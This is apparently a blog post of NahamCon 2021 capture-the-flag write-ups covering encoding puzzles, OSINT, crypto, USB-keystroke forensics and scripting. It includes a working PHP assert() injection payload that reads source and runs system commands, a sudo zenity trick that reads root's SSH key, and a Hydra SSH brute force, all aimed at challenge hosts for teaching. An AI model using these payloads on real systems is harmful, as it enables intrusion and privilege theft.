---
title: "nahamConCTF 2021"
description: "Challenges I solved during 2021 NahamCon CTF."
date: 2021-03-13T09:24:19-05:00
url: "/ctfs/2021/nahamcon-writeups"
type:
 - post
categories:
 - capture the flag writeups
tags:
 - ctfs
---

> NahamCon 2021 CTF
>
> Friday, 12 March 12:00 PT â€” Sunday, 14 March 12:00 PT
>
> 48-hour Competition
>
>
> Flag Format
> * Flags for this competition will follow the format: `flag\{[0-9a-f]{32}\}`. That means a `flag{}` wrapper with what looks like an MD5 hash inside the curly braces. If you look closely, you can even find a flag on this page!

# Solved

|Warmups | Web | The Mission | Crypto | Forensics | Misc | Scripting |
|-------|------|-------------|--------|-----------|------|------|
| [rules flag](#rules-flag) | [Asserted](#asserted) | [Bionic](#bionic) | [eaxy](#eaxy) | [henpeck](#henpeck) | [Abyss](#abyss) | [Ngrocket](#ngrocket) |
| [shoelaces](#shoelaces) | | [Meet the Team](#meet-the-team) | [dice roll](#dice-roll) | | [Zenith](#zenith) |
| [esab64](#esab64) | | [Gus](#gus) | | | |
| [buzz](#buzz) | | [Hercules](#hercules) | | | |
| [Eighth Circle](#eighth-circle) | | [Lyra](#lyra) | | | |
| | | [Orion](#orion) | | | |
| | | [Hydraulic](#hydraulic) | | | |




## Warmups

### Rules Flag

```html
<!-- Thank you for reading the rules! Your flag is: -->
<!--   flag{90bc54705794a62015369fd8e86e557b}       -->
```

Flag is `flag{90bc54705794a62015369fd8e86e557b}`.

### Shoelaces
> Author: @JohnHammond#6971
>
> Do you double-knot your shoelaces? You gotta keep'em tied!
>
> Download the file below.
>
> Attachments: *shoelaces.jpg*

Attached is a photo of shoe _strings_. Run `strings` on the photo:

```bash
strings shoelaces.jpg| grep flag
flag{137288e960a3ae9b148e8a7db16a69b0}
```

Flag is `flag{137288e960a3ae9b148e8a7db16a69b0}`

### esab64
> Author: @JohnHammond#6971
>
> Was it a car or a cat I saw?
>
> Download the file below.
>
> Attachments: *esab64*

Attached is the following:

```bash
mxWYntnZiVjMxEjY0kDOhZWZ4cjYxIGZwQmY2ATMxEzNlFjNl13X
```

Which looks obviously like base64. Is also likely reversed given the name.

```bash
cat esab64 | rev | base64 -d | rev
flag{fb5211b498afe87b1bd0db601117e16e}_
```

Flag is `flag{fb5211b498afe87b1bd0db601117e16e}`.

### Buzz
> Author: @JohnHammond#6971
>
> You know, that sound that bumblebees make?
>
> Download the file below.
>
> Attachments: *buzz*

Attached file is the following:

```bash
file buzz
buzz: compress'd data 16 bits
```

Googling for the bytes and signature, looks like it is an old `.z` file; appending that and running `7z e buzz.z`, we get a file containing the flag.

Flag is `flag{b3a33db7ba04c4c9052ea06d9ff17869}`.

### Eighth Circle
> Author: @JohnHammond#6971
>
> Abandon all hope, ye who enter here...
>
> Download the file below.
>
> Attachments: *eight_circle*.

Attached file looks like the following:

```
D'`r#LK\[}{{EUUTet,r*qo'nmlk5ihVB0S!>w<<)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMRQJn1MLKJCg*)ED=a$:?>7[;:981w/4-,P*p(L,%*)"!~}CB"!~}_uzs9wpotsrqj0Qmfkdcba'H^]\[Z~^W?[TSRWPt7MLKo2NMFj-IHG@dD&<;@?>76Z{9276/.R21q/.-&J*j(!E%$d"y?`_{ts9qpon4lTjohg-eMihg`&^cb[!_X@VzZ<RWVOTSLpP2HMFEDhBAFE>=BA:^8=6;:981Uvu-,10/(Lm%*)(!~D1
```

Seeing as it's a warmup and not some weird encoding, I thought it was an esoteric type programming language. Googling "eight circle hell esoteric programming language" gives results for the [Malbolge](https://en.wikipedia.org/wiki/Malbolge) language. Another google search for "Malbolge interpreter" will give you a site you can paste the given file and run and get the flag.

Flag is `flag{bf201f669b8c4adf8b91f09165ec8c5c}`.


## Web
### Asserted
> Author: dead#4282 & @JohnHammond#6971
>
> Time to hit the gym! Assert all your energy! Err, wait, is the saying "exert" all your energy? I don't know...
>
> The flag is in `/flag.txt`.

Website looks like so:

{{< image src="/img/nahamConCTF2021/asserted_home.png" alt="asserted_home.png" position="center" style="border-radius: 8px;" >}}

Navigating to the webpage, we can see that when selecting a different subpage from the website, the URL to fetch it looks like so:

* http://challenge.nahamcon.com:31780/index.php?page=about

{{< image src="/img/nahamConCTF2021/asserted_about.png" alt="asserted_about.png" position="center" style="border-radius: 8px;" >}}

We notice that it is being fetched via the infamous `?page=about` syntax, and logically attempt to get some traversal, trying example payload `?page=../../../../../../etc/passwd`. But wait, they block it!

Navigating to http://challenge.nahamcon.com:31780/index.php?page=../../../../etc/passwd gives:

> HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE

It seems that they detect the `..` characters, and return that if found. So that won't work. Looking at the challenge name, it seems that we need to be taking advantage of the PHP assert() function.

A quick google search for "PHP assert LFI" leads to [this page detailing the methodology](https://hydrasky.com/network-security/php-assert-vulnerable-to-local-file-inclusion/). Trying the URL to get the source code for the index page on our website,

```
http://challenge.nahamcon.com:31780/index.php?page=php://filter/convert.base64-encode/resource=index
```

we end up getting the source code:

```bash
PD9waHANCg0KaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7DQogICRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsNCiAgJGZpbGUgPSAkcGFnZSAuICIucGhwIjsNCg0KICAvLyBTYXZpbmcgb3Vyc2VsdmVzIGZyb20gYW55IGtpbmQgb2YgaGFja2luZ3MgYW5kIGFsbA0KICBhc3NlcnQoInN0cnBvcygnJGZpbGUnLCAnLi4nKSA9PT0gZmFsc2UiKSBvciBkaWUoIkhBQ0tJTkcgREVURUNURUQhIFBMRUFTRSBTVE9QIFRIRSBIQUNLSU5HIFBSRVRUWSBQTEVBU0UiKTsNCiAgDQp9IGVsc2Ugew0KICAkZmlsZSA9ICJob21lLnBocCI7DQp9DQoNCmluY2x1ZGUoJGZpbGUpOw0KDQo/Pg0K
```

Which we can then base64 decode to see the source code for the index page:

```php
<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");

} else {
  $file = "home.php";
}

include($file);

?>
```

So indeed, they filter out `..` which confirms what we saw above. And it confirms that we should be exploiting that assert line that _saves them from any kind of hacking..._.

For example,

* `?page=%27).%20phpinfo();%20//`

Gives us the phpinfo page. We can now mostly get any arbitrary command we want through PHP, now its just a matter of finding the flag.

We can try using the `system()` command to do an `ls`:

* `?page=%27).%20system(%22ls%20-lah%22);%20//`

Which gives:

```
total 184K drwxr-xr-x 1 root root 4.0K Mar 6 06:15 . drwxrwxrwx 1 root root 4.0K Mar 6 06:15 .. -rwxr-xr-x 1 root root 21K Mar 6 06:14 about.php -rwxr-xr-x 1 root root 22K Mar 6 06:14 blog-single.php -rwxr-xr-x 1 root root 15K Mar 6 06:14 blog.php -rwxr-xr-x 1 root root 12K Mar 6 06:14 contact.php drwxr-xr-x 2 root root 4.0K Mar 6 06:14 css drwxr-xr-x 2 root root 4.0K Mar 6 06:14 fonts -rwxr-xr-x 1 root root 17K Mar 6 06:14 gallery.php -rw-r--r-- 1 root root 36K Mar 6 06:14 home.php drwxr-xr-x 9 root root 4.0K Mar 6 06:14 img -rwxr-xr-x 1 root root 327 Mar 6 06:14 index.php drwxr-xr-x 2 root root 4.0K Mar 6 06:14 js -rwxr-xr-x 1 root root 24K Mar 6 06:14 schedule.php
```

Bam! To check we can see the flag:

* `?page=%27).%20system(%22ls%20-lah%20/flag.txt%22);%20//`

```bash
-rw-r--r-- 1 root root 39 Mar 6 06:14 /flag.txt
```

Now we just can use `system()` to cat that and get the flag:)

* `page=%27).%20system(%22cat%20/flag.txt%22);%20//`

Gives

```
flag{85a25711fa6e111ed54b86468a45b90c}
```

Flag is `flag{85a25711fa6e111ed54b86468a45b90c}`.

## The Mission

### First Flag

Is the one from the rule page; `flag{48e117a1464c3202714dc9a350533a59}`.

### Bionic
> Author: @JohnHammond#6971
>
> Thank you for taking on The Mission. You can begin by exploring the CONSTELLATIONS public website, [constellations.page](https://constellations.page/).
>
> CONSTELLATIONS has "tried" to reduce their attack surface by offering just a static website. But you might find some low-hanging fruit to get you started.
>
> With the flag of this challenge, you should also find a new URL that will assist in the next challenge.
>
> After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.

The webpage looks like so:

{{< image src="/img/nahamConCTF2021/constellations_home.png" alt="constellations_home.png" position="center" style="border-radius: 8px;" >}}

In true CTF form, we check `/robots.txt` first, and find the flag:

```
User-agent: *
Disallow: /meet-the-team.html

flag{33b5240485dda77430d3de22996297a1}  # this flag is for `Bionic`
```

Flag is `flag{33b5240485dda77430d3de22996297a1}`.

### Meet The Team
> Author: @JohnHammond#6971
>
> Recover the list of employees working at CONSTELLATIONS.
>
> With the flag of this challenge, you should find new information that will help with future challenges.

Scrolling around the page, we don't see any mention of a team or who we are page. At the bottom, there are some social media links. Navigating to the Twitter one, we see a single tweet with a flag. Attempting to submit it for this challenge works.

Flag is `flag{e483bffafbb0db5eabc121846b455bc7}`.

N.B. Seems like this flag wasn't the actual flag for this challenge. The "true" flag was supposed to have been accessed by noticing that the source for the webpage mentions:

```html
<!-- Vela, can we please stop sharing our version control software out on the public internet? -->
```

Which means that the site exposes a `.git` folder of the code for the page. i.e.

* https://constellations.page/.git/HEAD

Gives:

```
e7d4663ac6b436f95684c8bfc428cef0d7731455
```

You can use a tool like [GitHacker](https://github.com/WangYihang/GitHacker) to automatically scrape all of the contents to a local, working git directory.

Doing so, we can see three commits in the repo, one for creation, one to add the "meet the team" page, and one to remove it:

```
git --no-pager log
commit e7d4663ac6b436f95684c8bfc428cef0d7731455 (HEAD)
Author: Leo Rison <leo.rison@constellations.page>
Date:   Tue Feb 23 19:20:14 2021 -0500

    Management said I need to remove the team details so I redacted that page and added it to robots.txt

commit 4c88ac1c56fe228267cf415c3ef87d7c3b8abd60
Author: Leo Rison <leo.rison@constellations.page>
Date:   Tue Feb 23 19:19:32 2021 -0500

    Added the Meet The Team page

commit 1142cc3145fdba8d9eb8f9c9e7ee79bdfda64d9a
Author: Leo Rison <leo.rison@constellations.page>
Date:   Tue Feb 23 18:53:50 2021 -0500

    Added initial assets and landing page
```

Looks like we want the middle one, so we can checkout that out and then grep for the flag, and see the "true" meet the team flag as a comment:

```bash
git checkout 4c88ac1c56fe228267cf415c3ef87d7c3b8abd60

grep -r 'flag{' .
meet-the-team.html:				<!-- <li><h4><b>flag{4063962f3a52f923ddb4411c139dd24c}</b></h4></li> -->
```

### Gus
> Author: @JohnHammond#6971
>
> This is Stage 1 of Path 4 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
>
> Use open-source intelligence to track down information on Gus.
>
> With the flag of this challenge, you should also find details you can use in later challenges.

So, on the social media icons from above, there is a Github one. Going to that, we land at https://github.com/constellations-git.

There are no repos or packages, and only one person in the organization: _[Gus Rodry](https://github.com/gusrodry)_

Going to his profile, his most recent commit was "update flag.txt". Safe to assume that's the flag for this challenge:

```

# NOTE:
# This flag submits for the `Gus` challenge you should see after solving `Meet The Team`, after you solve `Bionic`

flag{84d5cc7e162895fa0a5834f1efdd0b32}
```

Flag is `flag{84d5cc7e162895fa0a5834f1efdd0b32}`.

Note to self: In this repo is some stuff that looks like it'll be useful in the later challenges, notably the `.ssh` directory this is in, which includes some SSH keys.

### Hercules

From Gus' github profile, we can see he has 4 followers. One of which is [HerculesScox](https://github.com/HerculesScox) which seems to match the name of this quest branch, _Hercules_.

From their github page, we can see a [maintenance](https://github.com/HerculesScox/maintenance) repo. In there, we can see a [connect.sh](https://github.com/HerculesScox/maintenance/blob/main/connect.sh) file. In there is the flag:

```bash
#!/bin/bash

IP=$1
PORT=$1

sshpass -p starstruckherc ssh hercules@$IP -p $PORT
#
# This flag can be submitted for the `Hercules` challenges, revealed after you solve `Meet The Team`, visible after you solve `Bionic`
# flag{5bf9da15002d7ea53cb487f31781ce47}
```

Flag is `flag{5bf9da15002d7ea53cb487f31781ce47}`.

### Lyra
> Author: @JohnHammond#6971
>
> This is Stage 1 of Path 5 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
>
> Use open-source intelligence to track down information on Lyra.
>
> With the flag of this challenge, you should also find details you can use in later challenges.

Searching Github for "Lyra Patte" doesn't yield any results. Searching Twitter yields one user, https://twitter.com/LyraPatte.

{{< image src="/img/nahamConCTF2021/lyra_patte_twitter.png" alt="lyra_patte_twitter.png" position="center" style="border-radius: 8px;" >}}

So this looks right. Scrolling through their tweets, we find a tweet that contains the following:

> Oh, Pavo wasn't able to able to share the job application portal, so I'll share it here. https://constellations.page/constellations-documents/1/
>
> We look forward to seeing your applications!

That URL looks _sus_. Navigating there, we see:

{{< image src="/img/nahamConCTF2021/const_documents_1.png" alt="const_documents_1.png" position="center" style="border-radius: 8px;" >}}

We note that it's on page `/1`. Manually going to `/2`, we find some more junk pages. We can keep going until we hit page `/5`, which has some useful info:

{{< image src="/img/nahamConCTF2021/const_documents_5.png" alt="const_documents_5.png" position="center" style="border-radius: 8px;" >}}

We see the flag there.

Flag is `flag{bd869e6193c27308d2fd3ad4b427e8c3}`.

### Hydraulic
> Author: @JohnHammond#6971
>
> This is Stage 2 of Path 5 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
>
> Gain access with the information you have gathered thus far and retrieve the flag.
>
> You may bruteforce this challenge... hence the name ;)

After submitting the flag for Lyra, we see this challenge unlock. Given the information we see on the page from the previous challenge, and the name of this challenge, **Hydra**ulic, it seems as if we need to use the users as a list of usernames and the "Default Passwords" list as passwords as input to Hydra for this challenge.

Using Hydra on the host the challenge gives results in the following hit:

```
hydra -s <PORT> -L usernames -P passwords challenge.nahamcon.com ssh
...
[30743][ssh] host: 35.239.227.150   login: pavo   password: starsinthesky
```

Using those creds, we can log in to the box and cat a `flag.txt` file sitting in the home directory.

Flag is `flag{cadbbfd75d2547700221f8c2588e026e}`


### Orion
> Author: @JohnHammond#6971
>
> This is Stage 1 of Path 3 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
>
> Use open-source intelligence to track down information on Orion.
>
> With the flag of this challenge, you should also find a password you can use in later challenges.

Again, github search reveals nothing. Twitter search ends up in one user: https://twitter.com/OrionMorra.

Near the bottom of their tweets, we see the following:

{{< image src="/img/nahamConCTF2021/orion_morra.png" alt="orion_morra.png" position="center" style="border-radius: 8px;" >}}

We can see on the white piece of paper there what looks like the flag.

Flag is `flag{0bcffb17cbcbf4359a42ec45d0ccaf2}`.

## Crypto

### eaxy
> Author: @JohnHammond#6971
>
> Crypto is eaxy, it's all about math and keys :)
>
> Download the file below.
>
> Attached:  *eaxy*

The file looks like a bunch of random garbage bytes. Since it's a beginner crypto challenge, pretty safe to assume it has something to do with XOR (especially given the `x` replacing the normal letter in the challenge name).

If we run xortool against it, we see the most likely key length is `1`. When it hits a proper key, the file remains mostly junk, but there is an entry in the file that specifies the XOR key we used to get this output is the Xth character in the flag.

Writing a small python script to try every single length printable character and look for the known good output substring, we can recover all parts of the flag.

```python
#!/usr/bin/env python3
from string import printable as alphabet
import re

def xor_garbage(key, garbage):
    result = ""
    for byte in garbage:
        result += chr(byte ^ ord(key))
    return result

with open('eaxy', 'rb') as infile:
    garbage = infile.read()


flag = ["#"]*50
for letter in alphabet:
    result = xor_garbage(letter, garbage)
    if "flag" in result:
        match = re.findall('The XOR key(.*?)index of the flag :\)', result)
        for entry in match:
            flag[int(entry.split("is the")[1].split()[0])] = letter

print(''.join(flag))
```

Flag is `flag{16edfce5c12443b61828af6cab90dc79}`.

### dice roll
> Author: @JohnHammond#6971
>
> When you have just one source of randomness, it's "a die", but when you can have muliple -- it's 'dice!'
>
> NOTE: You are welcome to "brute force" this challenge if you feel you need to. ;)
>
> Download the file below and press the Start button on the top-right to begin this challenge.

Connecting to the service, we find that we need to guess the sum of some dice in order to get teh flag.

```
nc challenge.nahamcon.com 32535

              _______
   ______    | .   . |\
  /     /\   |   .   |.\
 /  '  /  \  | .   . |.'|
/_____/. . \ |_______|.'|
\ . . \    /  \ ' .   \'|
 \ . . \  /    \____'__\|
  \_____\/

      D I C E   R O L L


0. Info
1. Shake the dice
2. Roll the dice (practice)
3. Guess the dice (test)

> 0
Our dice are loaded with a whopping 32 bits of randomness!

0. Info
1. Shake the dice
2. Roll the dice (practice)
3. Guess the dice (test)

> 3
Guess the dice roll to win a flag! What will the sum total be?
> 69
No, sorry, that was not correct... the sum total was:
341046637
```

We are also given the source code for the service:

```python
#!/usr/bin/env python3

import random
import os

banner = """
              _______
   ______    | .   . |\\
  /     /\\   |   .   |.\\
 /  '  /  \\  | .   . |.'|
/_____/. . \\ |_______|.'|
\\ . . \\    /  \\ ' .   \\'|
 \\ . . \\  /    \\____'__\\|
  \\_____\\/

      D I C E   R O L L
"""

menu = """
0. Info
1. Shake the dice
2. Roll the dice (practice)
3. Guess the dice (test)
"""

dice_bits = 32
flag = open('flag.txt').read()

print(banner)

while 1:
	print(menu)

	try:
		entered = int(input('> '))
	except ValueError:
		print("ERROR: Please select a menu option")
		continue

	if entered not in [0, 1, 2, 3]:
		print("ERROR: Please select a menu option")
		continue

	if entered == 0:
		print("Our dice are loaded with a whopping 32 bits of randomness!")
		continue

	if entered == 1:
		print("Shaking all the dice...")
		random.seed(os.urandom(dice_bits))
		continue

	if entered == 2:
		print("Rolling the dice... the sum was:")
		print(random.getrandbits(dice_bits))
		continue

	if entered == 3:
		print("Guess the dice roll to win a flag! What will the sum total be?")
		try:
			guess = int(input('> '))
		except ValueError:
			print("ERROR: Please enter a valid number!")
			continue

		total = random.getrandbits(dice_bits)
		if guess == total:
			print("HOLY COW! YOU GUESSED IT RIGHT! Congratulations! Here is your flag:")
			print(flag)
		else:
			print("No, sorry, that was not correct... the sum total was:")
			print(total)

		continue
```

So, some things stick out:

* We can see how they're seeing the random calls (`random.seed(os.urandom(dice_bits))`)
* We can see how they're invoking random numbers (`random.getrandbits(dice_bits)` where `dice_bits` is `32`)
* We can see that we are able to invoke the challenge without "shuffling" the dice at all! (seed is called iff we select that menu option before we try solving).

The method they are using to generate "random" value is [getrandbits](https://docs.python.org/3/library/random.html#random.getrandbits). This uses the MersenneTwister generator by default. Since we are not seeding it before hand, and we have unlimited practice rounds, we can get enough values to reverse engineer the twister's initial state and predict future values (see for example [this randcrack repo](https://github.com/tna0y/Python-random-module-cracker)).

To do so:

```python
#!/usr/bin/env python3
from pwn import *
from randcrack import RandCrack
context.log_level = 'debug'

r = remote('challenge.nahamcon.com', 31784)

rc = RandCrack()
for i in range(624):
    r.sendafter(b'> ', '2\n')
    r.recvline()
    answer = r.recvline().decode().strip()
    print("????: ", answer)
    rc.submit(int(answer))


# test
r.sendafter(b'> ', '3\n')
r.recvline()
r.sendafter(b'> ', str(rc.predict_randrange(0, 4294967295))+"\n")
print(r.stream())
```

Flag is `flag{e915b62b2195d76bfddaac0160ed3194}`.

## Forensics
### henpeck
> Author: @JohnHammond#6971
>
> So I'll be honest, I never actually went through the Mavis Beacon program...
>
> Download the file below.
>
> attached: *henpeck.pcap*.

The attached file looks like a packet capture of a bunch of USB keyboard keystrokes. Using a tool I've used for numerous CTF challenges exactly like this one before, [Team Rocketist's ctf-usb-keyboard-parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser), we can extract the key presses and get the flag.


```
tshark -r ../henpeck.pcap -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > output

python usbkeyboard.py output
so the answer is flag{f7733e0093b7d281dd0a30fcf34a9634} hahahah lol
```

Flag is `flag{f7733e0093b7d281dd0a30fcf34a9634}`.

## Misc
### Abyss
> Author: @JohnHammond#6971
>
> A Vortex? No... an Abyss.
>
> Click the Start button on the top-right to start this challenge.

Connecting to the instance, it seems to just endlessly spew junk. Presumably the flag is somewhere in there.

Hopefully it is just straight plaintext in there. Guessing that is the case, we can run the following:

```bash
sshpass -puserpass ssh '-p 32140' user@challenge.nahamcon.com | grep flag
```

After about a minute, we can see a dump of info come through, which contains the flag.

Flag is `flag{db758a0cc25523993416c305ef15f9ad}`

### Zenith
> Author: @JohnHammond#6971
>
> Escalate your privileges and retrieve the flag out of root's home directory.
>
> There is intentionally no /root/flag.txt file present.
>
> Press the Start button on the top-right to begin this challenge.

Getting on the box, we first check if/what we are able to run as sudo:

```bash
$ sudo -l
Matching Defaults entries for user on zenith-dfd4d203743c58d4-74cfb97cf4-nf8bd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on zenith-dfd4d203743c58d4-74cfb97cf4-nf8bd:
    (root) /usr/bin/zenity
```

So, it looks like we can run [zenity](http://manpages.ubuntu.com/manpages/precise/en/man1/zenity.1.html) as root user.

> zenity is a program that will display GTK+ dialogs, and return (either in the return code, or on standard output) the users input. This allows you to present  information,  and  ask for information from the user, from all manner of shell scripts.

Reading through the manpage, `--file-selection` seems interesting; we should be able to read any file directory to check for the flag.

Doing so, we see there is a `/root/get_flag` file. However, `--file-selection` only returns the path to the file. We still need a way to read the contents.

If we combine `--text-info` and `--filename`, we are able to read a file's contents to a dialog window:

```bash
sudo zenity --filename=/root/get_flag --text-info
```

However, the returned text looks like the file is a script:

* non ascii printable characters
* `ELF` contained in the output.

So, `/root/get_flag` is a script. We now need a way to run that script through Zenity, or a way to copy the script to a location/place we are able to execute manually as non-root.

After searching through Zenity manpage and help docs for a while, we determined it wasn't going to be possible to try to execute/encode the file/some other way of getting the flag directly via that script using Zenity.

However, after a bit, my teamate Datajerk noticed we are able to enable "show hidden files" while looking in a directory in Zenity's `--file-selection` window!

Doing this, we find a `.ssh` directory in root's directory. In there, lo and behold, there is a `id_rsa` private key file. Using the same `--filename`+`--text-info` from before, we can read the file's contents, and copy+paste to a local file we have normal access to:

```bash
sudo zenity --filename=/root/.ssh/id_rsa --text-info
# copy+paste to ~/root_id_rsa
chmod 700 ~/root_id_rsa
```

Now, we can just `ssh -i root_id_rsa root@localhost` and have full root privelege! All that's left is to make `/root/get_flag` executable and execute it.

```bash
chmod +x /root/get_flag
./root/get_flag
```

Flag is `flag{d1fbeab9101e0ee7fc1342e4c96b4603}`.


## Scripting

### Ngrocket
> Author: @JohnHammond#6971
>
> Didn't know this party was BYOB, bring-your-own-box? No worries! Blast off as many rockets as you would like to a location of your choosing! Hope the right one lands...
>
> Press the Start button on the top-right to begin this challenge.

Connecting to the endpoint, we get a nice ascii art looking rocket, and the service's interface:

```
nc challenge.nahamcon.com 30574

                           *     .--.
                                / /  `
               +               | |
                      '         \ \__,
                  *          +   '--'  *
                      +   /\
         +              .'  '.   *
                *      /======\      +
                      ;:.  _   ;
                      |:. (_)  |
                      |:.  _   |
            +         |:. (_)  |          *
                      ;:.      ;
                    .' \:.    / `.
                   / .-'':._.'`-. \
                   |/    /||\    \|
                 _..--'''````'''--.._
           _.-'``                    ``'-._
         -'                                '-



Thanks for joining us at the ngrocket launch pad!
We will send a rocket to a location of your choosing.
Please give us your coordinates in the form like so...
   <host>:<port>
Where would you like this ngrocket to land?
>
```

I just entered a random address to start to see what it does:

```
> localhost:0000
Oh no! We can't launch the ngrocket to those coordinates.
Please ensure the host ends with 'ngrok.io'
```

OK, so we need to have some [ngrok](https://ngrok.com/) coordinates to be able to send the rocket to. Makes sense, given the name of the challenge;)

If you've never used ngrok before, you'll need to sign up for a (free) account, so that we can use the TCP option.

Once you've signed up and have synced your local ngrok config to your account's authtoken, we can setup a session on our local machine like so:

```bash
ngrok tcp <PORT>
```

I invoked it like so:

```bash
ngrok tcp 6969
```

which then sets up the session, and leaves you in a prompt like so:

```
ngrok by @inconshreveable                                               (Ctrl+C to quit)

Session Status                online
Account                       <Your NAme> (Plan: Free)
Version                       2.3.35
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://<address>:<port> -> localhost:6969

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

Leave this running, and in a separate window, we can start listening locally to that port like so:

```bash
nc -l 6969
```

Leave that running as well. Lastly, in a third window, we can go back to the service and enter our ngrok address/port and see that it will launch a rocket to us now!

```
...
Where would you like this ngrocket to land?
> 2.tcp.ngrok.io:12901
Aaaand BLAST OFF!!!
Here were our launch details. Hopefully we fired off the right rocket...
 Launch type: AES-CBC
 Key:         910d3bfc27c5173e2e0f367a3b9ada43
 IV:          f998e6464b6356af57e0015388f57dc3
Thanks for sending off an ngrocket!!
```

Back on our netcat window, we see that it recieved the information that was sent and is now closed:

```
049c59fb19e19761bb36b2217e60f2197f9822c123ae5f6f71d0711fa653de405d7f7f199d4d005df1cfa64010eff327acdbd079c5ac85286fcda66f3893905e
```

So, it looks like we have been given some AES CBC creds, and an associated ciphertext that we need to decrypt. The issue here is that the given key+IV+ciphertext don't always result in a valid decryption. I guess this lines up with the "Hopefully we fired off the right rocket..." snippet in the service prompt.

_When the "correct" rocket is launched_, the decrypted ciphertext reveals information about our flag, indicating a single character and it's index in the flag, example:

```
Your flag has character '8' at index 31
```

So it looks like we need to automate connecting to the service, setting up a local listening service on our port, send the ngrok coordinates, parse out the given IV and key, fetch the sent ciphertext, and then attempt to decrypt.

* If garbage or an exception occurs, ignore, and just go launch another one.
* If valid, we update our "flag-so-far" flag, and keep going.

I chose to do this in Python, using pwntools, so that is what I will provide.

The script does exactly what is described in the above paragraph:

```python
#!/usr/bin/env python3
from pwn import *
from Crypto.Cipher import AES
from binascii import unhexlify, hexlify

ngrok = "4.tcp.ngrok.io:17184"
flag = ["#"]*40
context.log_level = 'WARN'

while (1<2):
    try:
        p = process(['/usr/bin/nc', '-l', '6969'])
        r = remote('challenge.nahamcon.com', 30568)

        r.sendlineafter('> ', ngrok)
        r.recvline(); r.recvline(); r.recvline()
        key = r.recvline().decode().strip().split()[-1]
        iv = r.recvline().decode().strip().split()[-1]

        result = p.recvline().decode().strip()
        aes = AES.new(unhexlify(key), AES.MODE_CBC, unhexlify(iv))

        try:
            result = aes.decrypt(unhexlify(result))
            if b"flag" in result.lower():
                # Your flag has character 'd' at index 21
                print(result.decode().strip())
                split = result.decode().strip().split()
                character = split[4]
                idx = split[-1]
                flag[int(idx)] = character[1:-1]
                print(''.join(flag))

        except Exception as e:
            pass

        p.close()
        r.close()
    except socket.gaierror:
        pass
```

We can just run this and let it rip for a while, and eventually we will see that we have a fully formed flag!

{{< code language="bash" title="Ngrocket output" expand="Show output" collapse="Hide" isCollapsed="true" >}}
time python ngrocket_solve.py
Your flag has character '8' at index 10
##########8#############################
Your flag has character 'l' at index 1
#l########8#############################
Your flag has character 'c' at index 19
#l########8########c####################
Your flag has character '4' at index 17
#l########8######4#c####################
Your flag has character '5' at index 5
#l###5####8######4#c####################
Your flag has character 'a' at index 2
#la##5####8######4#c####################
Your flag has character 'c' at index 27
#la##5####8######4#c#######c############
Your flag has character '1' at index 25
#la##5####8######4#c#####1#c############
Your flag has character '3' at index 26
#la##5####8######4#c#####13c############
Your flag has character '}' at index 37
#la##5####8######4#c#####13c#########}##
Your flag has character '2' at index 11
#la##5####82#####4#c#####13c#########}##
Your flag has character 'c' at index 36
#la##5####82#####4#c#####13c########c}##
Your flag has character 'a' at index 9
#la##5###a82#####4#c#####13c########c}##
Your flag has character '8' at index 35
#la##5###a82#####4#c#####13c#######8c}##
Your flag has character '8' at index 10
#la##5###a82#####4#c#####13c#######8c}##
Your flag has character 'e' at index 12
#la##5###a82e####4#c#####13c#######8c}##
Your flag has character 'd' at index 21
#la##5###a82e####4#c#d###13c#######8c}##
Your flag has character '8' at index 35
#la##5###a82e####4#c#d###13c#######8c}##
Your flag has character '1' at index 25
#la##5###a82e####4#c#d###13c#######8c}##
Your flag has character '1' at index 25
#la##5###a82e####4#c#d###13c#######8c}##
Your flag has character '8' at index 35
#la##5###a82e####4#c#d###13c#######8c}##
Your flag has character '2' at index 11
#la##5###a82e####4#c#d###13c#######8c}##
Your flag has character '4' at index 17
#la##5###a82e####4#c#d###13c#######8c}##
Your flag has character '{' at index 4
#la#{5###a82e####4#c#d###13c#######8c}##
Your flag has character 'a' at index 15
#la#{5###a82e##a#4#c#d###13c#######8c}##
Your flag has character 'a' at index 28
#la#{5###a82e##a#4#c#d###13ca######8c}##
Your flag has character '2' at index 11
#la#{5###a82e##a#4#c#d###13ca######8c}##
Your flag has character '3' at index 26
#la#{5###a82e##a#4#c#d###13ca######8c}##
Your flag has character '8' at index 31
#la#{5###a82e##a#4#c#d###13ca##8###8c}##
Your flag has character '8' at index 10
#la#{5###a82e##a#4#c#d###13ca##8###8c}##
Your flag has character 'c' at index 19
#la#{5###a82e##a#4#c#d###13ca##8###8c}##
Your flag has character 'b' at index 14
#la#{5###a82e#ba#4#c#d###13ca##8###8c}##
Your flag has character 'g' at index 3
#lag{5###a82e#ba#4#c#d###13ca##8###8c}##
Your flag has character '3' at index 26
#lag{5###a82e#ba#4#c#d###13ca##8###8c}##
Your flag has character '4' at index 18
#lag{5###a82e#ba#44c#d###13ca##8###8c}##
Your flag has character '0' at index 16
#lag{5###a82e#ba044c#d###13ca##8###8c}##
Your flag has character '8' at index 35
#lag{5###a82e#ba044c#d###13ca##8###8c}##
Your flag has character '0' at index 20
#lag{5###a82e#ba044c0d###13ca##8###8c}##
Your flag has character 'd' at index 21
#lag{5###a82e#ba044c0d###13ca##8###8c}##
Your flag has character '6' at index 24
#lag{5###a82e#ba044c0d##613ca##8###8c}##
Your flag has character '8' at index 31
#lag{5###a82e#ba044c0d##613ca##8###8c}##
Your flag has character 'a' at index 15
#lag{5###a82e#ba044c0d##613ca##8###8c}##
